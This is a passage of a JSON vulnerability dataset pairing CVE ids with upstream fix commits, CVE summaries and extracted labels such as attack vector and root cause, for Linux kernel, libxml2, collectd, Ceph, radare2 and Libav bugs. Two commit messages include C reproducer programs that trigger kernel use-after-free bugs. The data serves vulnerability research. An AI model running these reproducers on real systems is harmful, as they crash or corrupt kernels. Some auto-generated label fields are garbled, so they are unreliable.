arch\/x86\/kernel\/ldt.c:67\n     write_ldt+0x7b7\/0xab0 arch\/x86\/kernel\/ldt.c:277\n     sys_modify_ldt+0x1ef\/0x240 arch\/x86\/kernel\/ldt.c:307\n     entry_SYSCALL_64_fastpath+0x1f\/0xbe\n\n    Freed by task 3700:\n     save_stack_trace+0x16\/0x20 arch\/x86\/kernel\/stacktrace.c:59\n     save_stack+0x43\/0xd0 mm\/kasan\/kasan.c:447\n     set_track mm\/kasan\/kasan.c:459 [inline]\n     kasan_slab_free+0x71\/0xc0 mm\/kasan\/kasan.c:524\n     __cache_free mm\/slab.c:3503 [inline]\n     kfree+0xca\/0x250 mm\/slab.c:3820\n     free_ldt_struct.part.2+0xdd\/0x150 arch\/x86\/kernel\/ldt.c:121\n     free_ldt_struct arch\/x86\/kernel\/ldt.c:173 [inline]\n     destroy_context_ldt+0x60\/0x80 arch\/x86\/kernel\/ldt.c:171\n     destroy_context arch\/x86\/include\/asm\/mmu_context.h:157 [inline]\n     __mmdrop+0xe9\/0x530 kernel\/fork.c:889\n     mmdrop include\/linux\/sched\/mm.h:42 [inline]\n     __mmput kernel\/fork.c:916 [inline]\n     mmput+0x541\/0x6e0 kernel\/fork.c:927\n     copy_process.part.36+0x22e1\/0x4af0 kernel\/fork.c:1931\n     copy_process kernel\/fork.c:1546 [inline]\n     _do_fork+0x1ef\/0xfb0 kernel\/fork.c:2025\n     SYSC_clone kernel\/fork.c:2135 [inline]\n     SyS_clone+0x37\/0x50 kernel\/fork.c:2129\n     do_syscall_64+0x26c\/0x8c0 arch\/x86\/entry\/common.c:287\n     return_from_SYSCALL_64+0x0\/0x7a\n\nHere is a C reproducer:\n\n    #include <asm\/ldt.h>\n    #include <pthread.h>\n    #include <signal.h>\n    #include <stdlib.h>\n    #include <sys\/syscall.h>\n    #include <sys\/wait.h>\n    #include <unistd.h>\n\n    static void *fork_thread(void *_arg)\n    {\n        fork();\n    }\n\n    int main(void)\n    {\n        struct user_desc desc = { .entry_number = 8191 };\n\n        syscall(__NR_modify_ldt, 1, &desc, sizeof(desc));\n\n        for (;;) {\n            if (fork() == 0) {\n                pthread_t t;\n\n                srand(getpid());\n                pthread_create(&t, NULL, fork_thread, NULL);\n                usleep(rand() % 10000);\n                syscall(__NR_exit_group, 0);\n            }\n            wait(NULL);\n        }\n    }\n\nNote: the reproducer takes advantage of the fact that alloc_ldt_struct()\nmay use vmalloc() to allocate a large ->entries array, and after\ncommit:\n\n  5d17a73a2ebe (\"vmalloc: back off when the current task is killed\")\n\nit is possible for userspace to fail a task's vmalloc() by\nsending a fatal signal, e.g. via exit_group().  It would be more\ndifficult to reproduce this bug on kernels without that commit.\n\nThis bug only affected kernels with CONFIG_MODIFY_LDT_SYSCALL=y.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nAcked-by: Dave Hansen <dave.hansen@linux.intel.com>\nCc: <stable@vger.kernel.org> [v4.6+]\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Andy Lutomirski <luto@amacapital.net>\nCc: Borislav Petkov <bp@alien8.de>\nCc: Brian Gerst <brgerst@gmail.com>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Denys Vlasenko <dvlasenk@redhat.com>\nCc: Dmitry Vyukov <dvyukov@google.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Michal Hocko <mhocko@suse.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Rik van Riel <riel@redhat.com>\nCc: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: linux-mm@kvack.org\nFixes: 39a0526fb3f7 (\"x86\/mm: Factor out LDT init from context init\")\nLink: http:\/\/lkml.kernel.org\/r\/20170824175029.76040-1-ebiggers3@gmail.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The init_new_context function in arch\/x86\/include\/asm\/mmu_context.h in the Linux kernel before 4.12.10 does not correctly handle errors from LDT table allocation when forking a new process, allowing a local attacker to achieve a use-after-free or possibly have unspecified other impact by running a specially crafted program. This vulnerability only affected kernels built with CONFIG_MODIFY_LDT_SYSCALL=y.","commit_message_1":"fix use-after-free of ldt_struct the following commit : 39a0526fb3f7 ( `` x86\/mm : factor out ldt init from context init '' ) renamed init_new_context ( ) to init_new_context_ldt ( ) and added a new init_new_context ( ) which call init_new_context_ldt ( )","Vulnerability Type":"Use After Free","Attack Vector":"by running a specially crafted program","Impact":"achieve a use - after - free or possibly have unspecified other impact","Root Cause":"does not correctly handle errors from ldt table allocation when forking a new process","Attack Type":"local attacker"},{"commit_id":"2b7e8665b4ff51c034c55df3cff76518d1a9ee3a","cve_id":"CVE-2017-17052","cwe_id":"CWE-416","commit_message":"fork: fix incorrect fput of ->exe_file causing use-after-free\n\nCommit 7c051267931a (\"mm, fork: make dup_mmap wait for mmap_sem for\nwrite killable\") made it possible to kill a forking task while it is\nwaiting to acquire its ->mmap_sem for write, in dup_mmap().\n\nHowever, it was overlooked that this introduced an new error path before\na reference is taken on the mm_struct's ->exe_file.  Since the\n->exe_file of the new mm_struct was already set to the old ->exe_file by\nthe memcpy() in dup_mm(), it was possible for the mmput() in the error\npath of dup_mm() to drop a reference to ->exe_file which was never\ntaken.\n\nThis caused the struct file to later be freed prematurely.\n\nFix it by updating mm_init() to NULL out the ->exe_file, in the same\nplace it clears other things like the list of mmaps.\n\nThis bug was found by syzkaller.  It can be reproduced using the\nfollowing C program:\n\n    #define _GNU_SOURCE\n    #include <pthread.h>\n    #include <stdlib.h>\n    #include <sys\/mman.h>\n    #include <sys\/syscall.h>\n    #include <sys\/wait.h>\n    #include <unistd.h>\n\n    static void *mmap_thread(void *_arg)\n    {\n        for (;;) {\n            mmap(NULL, 0x1000000, PROT_READ,\n                 MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);\n        }\n    }\n\n    static void *fork_thread(void *_arg)\n    {\n        usleep(rand() % 10000);\n        fork();\n    }\n\n    int main(void)\n    {\n        fork();\n        fork();\n        fork();\n        for (;;) {\n            if (fork() == 0) {\n                pthread_t t;\n\n                pthread_create(&t, NULL, mmap_thread, NULL);\n                pthread_create(&t, NULL, fork_thread, NULL);\n                usleep(rand() % 10000);\n                syscall(__NR_exit_group, 0);\n            }\n            wait(NULL);\n        }\n    }\n\nNo special kernel config options are needed.  It usually causes a NULL\npointer dereference in __remove_shared_vm_struct() during exit, or in\ndup_mmap() (which is usually inlined into copy_process()) during fork.\nBoth are due to a vm_area_struct's ->vm_file being used after it's\nalready been freed.\n\nGoogle Bug Id: 64772007\n\nLink: http:\/\/lkml.kernel.org\/r\/20170823211408.31198-1-ebiggers3@gmail.com\nFixes: 7c051267931a (\"mm, fork: make dup_mmap wait for mmap_sem for write killable\")\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nTested-by: Mark Rutland <mark.rutland@arm.com>\nAcked-by: Michal Hocko <mhocko@suse.com>\nCc: Dmitry Vyukov <dvyukov@google.com>\nCc: Ingo Molnar <mingo@kernel.org>\nCc: Konstantin Khlebnikov <koct9i@gmail.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Vlastimil Babka <vbabka@suse.cz>\nCc: <stable@vger.kernel.org>\t[v4.7+]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The mm_init function in kernel\/fork.c in the Linux kernel before 4.12.10 does not clear the ->exe_file member of a new process's mm_struct, allowing a local attacker to achieve a use-after-free or possibly have unspecified other impact by running a specially crafted program.","commit_message_1":"fix incorrect fput of - > exe_file causing use-after-free commit 7c051267931a ( `` mm , fork : make dup_mmap wait for mmap_sem for write killable '' ) made it possible to kill a forking task while it is waiting to acquire it - > mmap_sem for write , in dup_mmap ( )","Vulnerability Type":"Use After Free","Attack Vector":"by running a specially crafted program","Impact":"achieve a use - after - free or possibly have unspecified other impact","Root Cause":"does not clear the - > exe _ file member of a new process ' s mm _ struct","Attack Type":"local attacker"},{"commit_id":"0c17d1d2c61936401f4702e1846e2c19b200f958","cve_id":"CVE-2017-16996","cwe_id":"CWE-119","commit_message":"bpf: fix incorrect tracking of register size truncation\n\nProperly handle register truncation to a smaller size.\n\nThe old code first mirrors the clearing of the high 32 bits in the bitwise\ntristate representation, which is correct. But then, it computes the new\narithmetic bounds as the intersection between the old arithmetic bounds and\nthe bounds resulting from the bitwise tristate representation. Therefore,\nwhen coerce_reg_to_32() is called on a number with bounds\n[0xffff'fff8, 0x1'0000'0007], the verifier computes\n[0xffff'fff8, 0xffff'ffff] as bounds of the truncated number.\nThis is incorrect: The truncated number could also be in the range [0, 7],\nand no meaningful arithmetic bounds can be computed in that case apart from\nthe obvious [0, 0xffff'ffff].\n\nStarting with v4.14, this is exploitable by unprivileged users as long as\nthe unprivileged_bpf_disabled sysctl isn't set.\n\nDebian assigned CVE-2017-16996 for this issue.\n\nv2:\n - flip the mask during arithmetic bounds calculation (Ben Hutchings)\nv3:\n - add CVE number (Ben Hutchings)\n\nFixes: b03c9f9fdc37 (\"bpf\/verifier: track signed and unsigned min\/max values\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Edward Cree <ecree@solarflare.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging register truncation mishandling.","commit_message_1":"fix incorrect tracking of register size truncation properly handle register truncation to a smaller size","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging register truncation mishandling","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"95a762e2c8c942780948091f8f2a4f32fce1ac6f","cve_id":"CVE-2017-16995","cwe_id":"CWE-119","commit_message":"bpf: fix incorrect sign extension in check_alu_op()\n\nDistinguish between\nBPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit)\nand BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit);\nonly perform sign extension in the first case.\n\nStarting with v4.14, this is exploitable by unprivileged users as long as\nthe unprivileged_bpf_disabled sysctl isn't set.\n\nDebian assigned CVE-2017-16995 for this issue.\n\nv3:\n - add CVE number (Ben Hutchings)\n\nFixes: 484611357c19 (\"bpf: allow access into map value arrays\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Edward Cree <ecree@solarflare.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"The check_alu_op function in kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.","commit_message_1":"fix incorrect sign extension in check_alu_op ( ) distinguish between bpf_alu64|bpf_mov|bpf_k ( load <number>-bit immediate , sign-extended to <number>-bit ) and bpf_alu|bpf_mov|bpf_k ( load <number>-bit immediate , zero-padded to <number>-bit ) ; only perform sign extension in the first case","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging incorrect sign extension","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"373c4557d2aa362702c4c2d41288fb1e54990b7c","cve_id":"CVE-2017-16994","cwe_id":"CWE-200","commit_message":"mm\/pagewalk.c: report holes in hugetlb ranges\n\nThis matters at least for the mincore syscall, which will otherwise copy\nuninitialized memory from the page allocator to userspace.  It is\nprobably also a correctness error for \/proc\/$pid\/pagemap, but I haven't\ntested that.\n\nRemoving the `walk->hugetlb_entry` condition in walk_hugetlb_range() has\nno effect because the caller already checks for that.\n\nThis only reports holes in hugetlb ranges to callers who have specified\na hugetlb_entry callback.\n\nThis issue was found using an AFL-based fuzzer.\n\nv2:\n - don't crash on ->pte_hole==NULL (Andrew Morton)\n - add Cc stable (Andrew Morton)\n\nFixes: 1e25a271c8ac (\"mincore: apply page table walker on do_mincore()\")\nSigned-off-by: Jann Horn <jannh@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The walk_hugetlb_range function in mm\/pagewalk.c in the Linux kernel before 4.14.2 mishandles holes in hugetlb ranges, which allows local users to obtain sensitive information from uninitialized kernel memory via crafted use of the mincore() system call.","commit_message_1":"report hole in hugetlb range this matter at least for the mincore syscall , which will otherwise copy uninitialized memory from the page allocator to userspace","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted use of the mincore ( ) system call .","Impact":"obtain sensitive information from uninitialized kernel memory","Root Cause":"mishandles holes","Attack Type":"local attacker"},{"commit_id":"1137b5e2529a8f5ca8ee709288ecba3e68044df2","cve_id":"CVE-2017-16939","cwe_id":"CWE-416","commit_message":"ipsec: Fix aborted xfrm policy dump crash\n\nAn independent security researcher, Mohamed Ghannam, has reported\nthis vulnerability to Beyond Security's SecuriTeam Secure Disclosure\nprogram.\n\nThe xfrm_dump_policy_done function expects xfrm_dump_policy to\nhave been called at least once or it will crash.  This can be\ntriggered if a dump fails because the target socket's receive\nbuffer is full.\n\nThis patch fixes it by using the cb->start mechanism to ensure that\nthe initialisation is always done regardless of the buffer situation.\n\nFixes: 12a169e7d8f4 (\"ipsec: Put dumpers on the dump list\")\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: Steffen Klassert <steffen.klassert@secunet.com>","summary":"The XFRM dump policy implementation in net\/xfrm\/xfrm_user.c in the Linux kernel before 4.13.11 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted SO_RCVBUF setsockopt system call in conjunction with XFRM_MSG_GETPOLICY Netlink messages.","commit_message_1":"fix aborted xfrm policy dump crash an independent security researcher , mohamed ghannam , ha reported this vulnerability to beyond security 's securiteam secure disclosure program","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted so _ rcvbuf setsockopt system call in conjunction with xfrm _ msg _ getpolicy netlink messages","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by an use-after-free","Attack Type":"local attacker"},{"commit_id":"899a5d9f0ed13b8e32449a08a361e0de127dd961","cve_id":"CVE-2017-16932","cwe_id":"CWE-835","commit_message":"Detect infinite recursion in parameter entities\n\nWhen expanding a parameter entity in a DTD, infinite recursion could\nlead to an infinite loop or memory exhaustion.\n\nThanks to Wei Lei for the first of many reports.\n\nFixes bug 759579.","summary":"parser.c in libxml2 before 2.9.5 does not prevent infinite recursion in parameter entities.","commit_message_1":"detect infinite recursion in parameter entity when expanding a parameter entity in a dtd , infinite recursion could lead to an infinite loop or memory exhaustion","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"does not prevent infinite recursion","Attack Type":"remote attacker"},{"commit_id":"e26630548e7d138d2c560844c43820b6767251e3","cve_id":"CVE-2017-16931","cwe_id":"CWE-119","commit_message":"Fix handling of parameter-entity references\n\nThere were two bugs where parameter-entity references could lead to an\nunexpected change of the input buffer in xmlParseNameComplex and\nxmlDictLookup being called with an invalid pointer.\n\nPercent sign in DTD Names\n=========================\n\nThe NEXTL macro used to call xmlParserHandlePEReference. When parsing\n\"complex\" names inside the DTD, this could result in entity expansion\nwhich created a new input buffer. The fix is to simply remove the call\nto xmlParserHandlePEReference from the NEXTL macro. This is safe because\nno users of the macro require expansion of parameter entities.\n\n- xmlParseNameComplex\n- xmlParseNCNameComplex\n- xmlParseNmtoken\n\nThe percent sign is not allowed in names, which are grammatical tokens.\n\n- xmlParseEntityValue\n\nParameter-entity references in entity values are expanded but this\nhappens in a separate step in this function.\n\n- xmlParseSystemLiteral\n\nParameter-entity references are ignored in the system literal.\n\n- xmlParseAttValueComplex\n- xmlParseCharDataComplex\n- xmlParseCommentComplex\n- xmlParsePI\n- xmlParseCDSect\n\nParameter-entity references are ignored outside the DTD.\n\n- xmlLoadEntityContent\n\nThis function is only called from xmlStringLenDecodeEntities and\nentities are replaced in a separate step immediately after the function\ncall.\n\nThis bug could also be triggered with an internal subset and double\nentity expansion.\n\nThis fixes bug 766956 initially reported by Wei Lei and independently by\nChromium's ClusterFuzz, Hanno B\u00f6ck, and Marco Grassi. Thanks to everyone\ninvolved.\n\nxmlParseNameComplex with XML_PARSE_OLD10\n========================================\n\nWhen parsing Names inside an expanded parameter entity with the\nXML_PARSE_OLD10 option, xmlParseNameComplex would call xmlGROW via the\nGROW macro if the input buffer was exhausted. At the end of the\nparameter entity's replacement text, this function would then call\nxmlPopInput which invalidated the input buffer.\n\nThere should be no need to invoke GROW in this situation because the\nbuffer is grown periodically every XML_PARSER_CHUNK_SIZE characters and,\nat least for UTF-8, in xmlCurrentChar. This also matches the code path\nexecuted when XML_PARSE_OLD10 is not set.\n\nThis fixes bugs 781205 (CVE-2017-9049) and 781361 (CVE-2017-9050).\nThanks to Marcel B\u00f6hme and Thuan Pham for the report.\n\nAdditional hardening\n====================\n\nA separate check was added in xmlParseNameComplex to validate the\nbuffer size.","summary":"parser.c in libxml2 before 2.9.5 mishandles parameter-entity references because the NEXTL macro calls the xmlParserHandlePEReference function in the case of a '%' character in a DTD name.","commit_message_1":"fix handling of parameter-entity reference there were two bug where parameter-entity reference could lead to an unexpected change of the input buffer in xmlparsenamecomplex and xmldictlookup being called with an invalid pointer","Vulnerability Type":"buffer overflow","Attack Vector":"By using a percent character in a DTD name","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper handling of parameter-entity references","Attack Type":"remote attacker"},{"commit_id":"d16c24542b2f96a194d43a73c2e5778822b9cb47","cve_id":"CVE-2017-16820","cwe_id":"CWE-415","commit_message":"snmp plugin: Fix double free of request PDU\n\nsnmp_sess_synch_response() always frees request PDU, in both case of request\nerror and success. If error condition occurs inside of `while (status == 0)`\nloop, double free of `req` happens.\n\nIssue: #2291\nSigned-off-by: Florian Forster <octo@collectd.org>","summary":"The csnmp_read_table function in snmp.c in the SNMP plugin in collectd before 5.6.3 is susceptible to a double free in a certain error case, which could lead to a crash (or potentially have other impact).","commit_message_1":"fix double free of request pdu snmp_sess_synch_response ( ) always free request pdu , in both case of request error and success","Vulnerability Type":"double free","Attack Vector":"The csnmp_read_table function in snmp.c in the SNMP plugin in collectd","Impact":"cause a denial of service","Root Cause":"caused by a double free error","Attack Type":"remote attacker"},{"commit_id":"b3118cabb8060a8cc6a01c4e8264cb18e7b1745a","cve_id":"CVE-2017-16818","cwe_id":"CWE-617","commit_message":"rgw: Remove assertions in IAM Policy\n\nA couple of them could be triggered by user input.\n\nSigned-off-by: Adam C. Emerson <aemerson@redhat.com>","summary":"RADOS Gateway in Ceph 12.1.0 through 12.2.1 allows remote authenticated users to cause a denial of service (assertion failure and application exit) by leveraging *full* (not necessarily admin) privileges to post an invalid profile to the admin API, related to rgw\/rgw_iam_policy.cc, rgw\/rgw_basic_types.h, and rgw\/rgw_iam_types.h.","commit_message_1":"remove assertion in iam policy a couple of them could be triggered by user input","Vulnerability Type":"Reachable Assertion","Attack Vector":"By leveraging \"full\" privileges to post an invalid profile to the admin API","Impact":"cause a denial of service","Root Cause":"caused by failing assertion through user input","Attack Type":"remote attacker"},{"commit_id":"2ca9ab45891b6ae8e32b6c28c81eebca059cbe5d","cve_id":"CVE-2017-16805","cwe_id":"CWE-125","commit_message":"Fix #8813 - segfault in dwarf parser","summary":"In radare2 2.0.1, libr\/bin\/dwarf.c allows remote attackers to cause a denial of service (invalid read and application crash) via a crafted ELF file, related to r_bin_dwarf_parse_comp_unit in dwarf.c and sdb_set_internal in shlr\/sdb\/src\/sdb.c.","commit_message_1":"fix # <number> - segfault in dwarf parser","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted elf file , related to r _ bin _ dwarf _ parse _ comp _ unit in dwarf . c and sdb _ set _ internal in shlr \/ sdb \/ src \/ sdb . c","Impact":"cause a denial of service ( invalid read and application crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"cd4663dc80323ba64989d0c103d51ad3ee0e9c2f","cve_id":"CVE-2017-16803","cwe_id":"CWE-119","commit_message":"smacker: add sanity check for length in smacker_decode_tree()\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n\nBug-Id: 1098\nCc: libav-stable@libav.org\nSigned-off-by: Sean McGovern <gseanmcg@gmail.com>","summary":"In Libav through 11.11 and 12.x through 12.1, the smacker_decode_tree function in libavcodec\/smacker.c does not properly restrict tree recursion, which allows remote attackers to cause a denial of service (bitstream.c:build_table() out-of-bounds read and application crash) via a crafted Smacker stream.","commit_message_1":"add sanity check for length in smacker_decode_tree ( ) bug-id : <number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted smacker stream","Impact":"cause a denial of service ( bitstream . c : build _ table ( ) out - of - bounds read and application crash )","Root Cause":"does not properly restrict tree recursion","Attack Type":"remote attacker"},{"commit_id":"ea04efee7635c9120d015dcdeeeb6988130cb67a","cve_id":"CVE-2017-16645","cwe_id":"CWE-125","commit_message":"Input: ims-psu - check if CDC union descriptor is sane\n\nBefore trying to use CDC union descriptor, try to validate whether that it\nis sane by checking that intf->altsetting->extra is big enough and that\ndescriptor bLength is not too big and not too small.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The ims_pcu_get_cdc_union_desc function in drivers\/input\/misc\/ims-pcu.c in the Linux kernel through 4.13.11 allows local users to cause a denial of service (ims_pcu_parse_cdc_data out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"ims-psu - check if cdc union descriptor is sane before trying to use cdc union descriptor , try to validate whether that it is sane by checking that intf- > altsetting- > extra is big enough and that descriptor blength is not too big and not too small","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( ims _ pcu _ parse _ cdc _ data out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"a50829479f58416a013a4ccca791336af3c584c7","cve_id":"CVE-2017-16643","cwe_id":"CWE-125","commit_message":"Input: gtco - fix potential out-of-bound access\n\nparse_hid_report_descriptor() has a while (i < length) loop, which\nonly guarantees that there's at least 1 byte in the buffer, but the\nloop body can read multiple bytes which causes out-of-bounds access.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nReviewed-by: Andrey Konovalov <andreyknvl@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The parse_hid_report_descriptor function in drivers\/input\/tablet\/gtco.c in the Linux kernel before 4.13.11 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"gtco - fix potential out-of-bound access parse_hid_report_descriptor ( ) ha a while ( i < length ) loop , which only guarantee that there 's at least <number> byte in the buffer , but the loop body can read multiple byte which cause out-of-bounds access","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"2130bf6f89ded32ef0c88a11694f107c52566c53","cve_id":"CVE-2017-16546","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/85","summary":"The ReadWPGImage function in coders\/wpg.c in ImageMagick 7.0.7-9 does not properly validate the colormap index in a WPG palette, which allows remote attackers to cause a denial of service (use of uninitialized data or invalid memory allocation) or possibly have unspecified other impact via a malformed WPG file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a malformed wpg file","Impact":"cause a denial of service ( use of uninitialized data or invalid memory allocation ) or possibly have unspecified other impact","Root Cause":"does not properly validate the colormap index","Attack Type":"remote attacker"},{"commit_id":"1c0edc3633b56000e18d82fc241e3995ca18a69e","cve_id":"CVE-2017-16535","cwe_id":"CWE-125","commit_message":"USB: core: fix out-of-bounds access bug in usb_get_bos_descriptor()\n\nAndrey used the syzkaller fuzzer to find an out-of-bounds memory\naccess in usb_get_bos_descriptor().  The code wasn't checking that the\nnext usb_dev_cap_header structure could fit into the remaining buffer\nspace.\n\nThis patch fixes the error and also reduces the bNumDeviceCaps field\nin the header to match the actual number of capabilities found, in\ncases where there are fewer than expected.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCC: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The usb_get_bos_descriptor function in drivers\/usb\/core\/config.c in the Linux kernel before 4.13.10 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"core : fix out-of-bounds access bug in usb_get_bos_descriptor ( ) andrey used the syzkaller fuzzer to find an out-of-bounds memory access in usb_get_bos_descriptor ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"2e1c42391ff2556387b3cb6308b24f6f65619feb","cve_id":"CVE-2017-16534","cwe_id":"CWE-119","commit_message":"USB: core: harden cdc_parse_cdc_header\n\nAndrey Konovalov reported a possible out-of-bounds problem for the\ncdc_parse_cdc_header function.  He writes:\n\tIt looks like cdc_parse_cdc_header() doesn't validate buflen\n\tbefore accessing buffer[1], buffer[2] and so on. The only check\n\tpresent is while (buflen > 0).\n\nSo fix this issue up by properly validating the buffer length matches\nwhat the descriptor says it is.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The cdc_parse_cdc_header function in drivers\/usb\/core\/message.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.","commit_message_1":"core : harden cdc_parse_cdc_header andrey konovalov reported a possible out-of-bounds problem for the cdc_parse_cdc_header function","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( out - of - bounds read and system crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"f043bfc98c193c284e2cd768fefabe18ac2fed9b","cve_id":"CVE-2017-16533","cwe_id":"CWE-125","commit_message":"HID: usbhid: fix out-of-bounds bug\n\nThe hid descriptor identifies the length and type of subordinate\ndescriptors for a device. If the received hid descriptor is smaller than\nthe size of the struct hid_descriptor, it is possible to cause\nout-of-bounds.\n\nIn addition, if bNumDescriptors of the hid descriptor have an incorrect\nvalue, this can also cause out-of-bounds while approaching hdesc->desc[n].\n\nSo check the size of hid descriptor and bNumDescriptors.\n\n\tBUG: KASAN: slab-out-of-bounds in usbhid_parse+0x9b1\/0xa20\n\tRead of size 1 at addr ffff88006c5f8edf by task kworker\/1:2\/1261\n\n\tCPU: 1 PID: 1261 Comm: kworker\/1:2 Not tainted\n\t4.14.0-rc1-42251-gebb2c2437d80 #169\n\tHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n\tWorkqueue: usb_hub_wq hub_event\n\tCall Trace:\n\t__dump_stack lib\/dump_stack.c:16\n\tdump_stack+0x292\/0x395 lib\/dump_stack.c:52\n\tprint_address_description+0x78\/0x280 mm\/kasan\/report.c:252\n\tkasan_report_error mm\/kasan\/report.c:351\n\tkasan_report+0x22f\/0x340 mm\/kasan\/report.c:409\n\t__asan_report_load1_noabort+0x19\/0x20 mm\/kasan\/report.c:427\n\tusbhid_parse+0x9b1\/0xa20 drivers\/hid\/usbhid\/hid-core.c:1004\n\thid_add_device+0x16b\/0xb30 drivers\/hid\/hid-core.c:2944\n\tusbhid_probe+0xc28\/0x1100 drivers\/hid\/usbhid\/hid-core.c:1369\n\tusb_probe_interface+0x35d\/0x8e0 drivers\/usb\/core\/driver.c:361\n\treally_probe drivers\/base\/dd.c:413\n\tdriver_probe_device+0x610\/0xa00 drivers\/base\/dd.c:557\n\t__device_attach_driver+0x230\/0x290 drivers\/base\/dd.c:653\n\tbus_for_each_drv+0x161\/0x210 drivers\/base\/bus.c:463\n\t__device_attach+0x26e\/0x3d0 drivers\/base\/dd.c:710\n\tdevice_initial_probe+0x1f\/0x30 drivers\/base\/dd.c:757\n\tbus_probe_device+0x1eb\/0x290 drivers\/base\/bus.c:523\n\tdevice_add+0xd0b\/0x1660 drivers\/base\/core.c:1835\n\tusb_set_configuration+0x104e\/0x1870 drivers\/usb\/core\/message.c:1932\n\tgeneric_probe+0x73\/0xe0 drivers\/usb\/core\/generic.c:174\n\tusb_probe_device+0xaf\/0xe0 drivers\/usb\/core\/driver.c:266\n\treally_probe drivers\/base\/dd.c:413\n\tdriver_probe_device+0x610\/0xa00 drivers\/base\/dd.c:557\n\t__device_attach_driver+0x230\/0x290 drivers\/base\/dd.c:653\n\tbus_for_each_drv+0x161\/0x210 drivers\/base\/bus.c:463\n\t__device_attach+0x26e\/0x3d0 drivers\/base\/dd.c:710\n\tdevice_initial_probe+0x1f\/0x30 